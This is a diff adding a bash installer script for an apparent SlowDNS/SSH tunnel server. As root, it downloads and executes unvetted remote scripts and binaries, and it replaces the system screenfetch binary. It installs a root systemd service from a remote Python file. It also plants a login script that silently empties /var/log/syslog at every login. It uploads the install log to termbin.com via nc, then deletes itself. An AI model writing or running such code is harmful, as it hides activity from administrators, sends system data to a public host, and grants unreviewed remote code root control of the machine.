@@ -1,0 +1,74 @@
+#!/bin/bash
+function screen() {
+apt install screenfetch -y
+rm -f /usr/bin/screenfetch
+wget -q -O /usr/bin/screenfetch https://github.com/imaPSYCHO/Parts/raw/main/screenfetch
+chmod +x /usr/bin/screenfetch
+
+echo 'clear' > /etc/profile.d/juans.sh
+echo 'echo '' > /var/log/syslog' >> /etc/profile.d/juans.sh
+echo 'screenfetch -p -A Ubuntu' >> /etc/profile.d/juans.sh
+chmod +x /etc/profile.d/juans.sh
+}
+
+function service() {
+wget -q -O /usr/sbin/yakult https://github.com/yakult13/ws/raw/main/service_8280.py
+chmod +x /usr/sbin/yakult
+
+cat << END > /lib/systemd/system/yakult.service
+[Unit]
+Description=Yakult
+Documentation=https://google.com
+After=network.target nss-lookup.target
+[Service]
+Type=simple
+User=root
+NoNewPrivileges=true
+CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
+AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
+ExecStart=/usr/bin/python -O /usr/sbin/yakult
+ProtectSystem=true
+ProtectHome=true
+RemainAfterExit=yes
+Restart=on-failure
+[Install]
+WantedBy=multi-user.target
+END
+
+systemctl enable yakult
+systemctl restart yakult
+}
+
+function slow() {
+apt update; apt upgrade -y; rm -rf install; wget https://raw.githubusercontent.com/xamjyss143/slow-dns/main/install; chmod +x install; ./install
+bash /etc/slowdns/slowdns-ssh
+startdns
+}
+
+screen
+service
+slow
+
+clear
+
+bash /etc/profile.d/juans.sh
+
+echo ""
+ echo -e ""
+  echo -e " DNS: $MYDNS" 
+ echo -ne "\033[1;33mYOUR KEY:\033[0m " && cat /root/server.pub
+ echo -ne "\033[1;33mYOUR NS:\033[0m " && cat /root/nameserver.txt
+ echo -e ""
+ echo -e "Please RUN this code after installation to finish SLOWDNS installation:"
+ echo -ne "\033[0mcurl -sO https://raw.githubusercontent.com/xamjyss143/slow-dns/main/scripts/slowdns && chmod +x slowdns && ./slowdns " && echo $(cat /root/nameserver.txt /root/server.pub)
+ echo -e ""
+ echo -e "RUN this code to show your Nameserver and Chave:"
+ echo -e "cat /etc/slowdns/infons /root/server.pub"
+ echo -e ""
+echo 3 > /proc/sys/vm/drop_caches
+echo -e "\n Install complete, please read README.md for instructions"
+echo -e " log: ~/install.log"
+cat ~/install.log | nc termbin.com 9999 | tr -d '\0' > /tmp/.juanvps.txt 2>&1
+echo -e " loglink: $(cat /tmp/.juanvps.txt)"
+rm -f /tmp/.juanvps.txt
+rm -f install.sh
